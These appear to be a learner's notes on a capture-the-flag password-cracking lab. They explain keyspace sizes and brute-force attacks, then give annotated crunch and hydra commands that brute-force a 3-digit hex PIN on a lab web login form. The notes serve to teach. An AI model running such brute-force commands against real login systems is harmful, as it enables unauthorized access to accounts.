We'll learn about the number of possible passwords
their complexity
and how to utilize two new tools: crunch and hydra
crunch
#generates passwords combinations
hydra
#bruteforce, tries mupltiple passwords automatically
###
    How many different PIN codes do we have?
    How many different passwords can we generate?
    How long does it take to find the password by brute force?
    How many passwords does the attacker have to try, and how long will it take?
###
A Brute-Force attack, happens when an attacker tries out possible combinations of passwords until he eventually gets the right one
###
With a 4 digits PIN that's 10^4 = 10000combinations possible


    A digit: We have 10 digits (0 to 9)
    An uppercase English letter: We have 26 letters (A to Z)
    A lowercase English letter: We have 26 letters (a to z)
each character can be one of 62 different choices,with special characters we get 30 more choices - the numbers ramp up pretty fast with lenght of the password too,
with 4 characters password we would get about 14/15 milions choices
but with 14 characters long, we can reach 12 followed by 24 zeroes - that's like billions of trillions of GIGABILIOMILIARDS 

speed of cracking can vary also, from the lenght to the power of our system, to the security measures imposed by the victim system (lockig us out after a few failed attempts)
with hash cracking we can do that offline so that's realy only dependant on our systems' power

let's get to cracking now
###
we get to see the interface asking for a pin with 3 digits
we have different characters 0-9 and A-F
so that's 16 hexadecimal characters total
time to use crunch and generate us a list of possibilities
which we can try then with hydra, to crack
#
crunch 3 3 0123456789ABCDEF -o 3digits.txt
# '3' and '3' are respectively 'min' 'max' digits
# -o we feed the characters to the 3digits.txt file
hydra -l '' -P /home/kali/AOC23.3digits.txt 10.10.161.213 -f -v http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
# -l tells the username to login '' is NONE
# -P wordlist
# IP
# -f stops when working pswd is found
# -v verbose
# form of http request
# that part will tell where the pass form is; pin is where the pass is inserted; the end is the destination page for error
# -s port
